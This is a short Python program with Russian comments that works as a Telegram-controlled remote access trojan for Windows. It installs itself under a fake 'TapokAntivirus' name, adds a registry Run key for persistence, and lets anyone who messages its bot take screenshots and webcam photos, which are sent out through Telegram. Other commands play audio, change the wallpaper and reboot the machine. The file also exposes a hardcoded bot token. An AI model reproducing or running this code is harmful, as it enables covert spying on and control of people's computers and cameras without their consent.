import os
import asyncio
import sys
import cv2
import pyautogui
import ctypes
import shutil
import subprocess
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import BufferedInputFile
from pygame import mixer

# Конфигурация
API_TOKEN = '8543450940:AAF5KG-Qa44HCYbsNRn0PS59D7QzoIEuzrQ'

bot = Bot(token=API_TOKEN)
dp = Dispatcher()
mixer.init()

def install_persistence():
    try:
        app_path = sys.executable
        target_dir = os.path.join(os.getenv('APPDATA'), 'TapokAntivirus')
        target_path = os.path.join(target_dir, 'tapok_svc.exe')
        if not os.path.exists(target_dir): os.makedirs(target_dir)
        if app_path != target_path:
            shutil.copy2(app_path, target_path)
            subprocess.run(f'reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "TapokAntivirus" /t REG_SZ /d "{target_path}" /f', shell=True, capture_output=True)
    except: pass

# --- Доступ открыт для ВСЕХ пользователей ---

@dp.message(F.voice | F.audio)
async def play_sound(message: types.Message):
    file_id = message.voice.file_id if message.voice else message.audio.file_id
    file = await bot.get_file(file_id)
    path = "t.mp3"
    await bot.download_file(file.file_path, path)
    mixer.music.load(path)
    mixer.music.play()
    while mixer.music.get_busy(): await asyncio.sleep(1)
    mixer.music.unload()
    os.remove(path)

@dp.message(F.text == "/screen")
async def send_screen(message: types.Message):
    pyautogui.screenshot("s.png")
    await message.answer_photo(BufferedInputFile(open("s.png", "rb").read(), filename="s.png"))
    os.remove("s.png")

@dp.message(F.text == "/cam")
async def send_cam(message: types.Message):
    cap = cv2.VideoCapture(0)
    ret, frame = cap.read()
    if ret:
        cv2.imwrite("c.jpg", frame)
        await message.answer_photo(BufferedInputFile(open("c.jpg", "rb").read(), filename="c.jpg"))
        os.remove("c.jpg")
    cap.release()

@dp.message(F.text.startswith("/wallpaper "))
async def set_wall(message: types.Message):
    url = message.text.split(" ", 1)[1]
    # Примечание: тут ожидается локальный путь или скачанный файл
    ctypes.windll.user32.SystemParametersInfoW(20, 0, url, 3)

@dp.message(F.text == "/reboot")
async def reboot_pc(message: types.Message):
    os.system("shutdown /r /t 1")

async def main():
    install_persistence()
    await dp.start_polling(bot)

if __name__ == '__main__':
    asyncio.run(main())
  
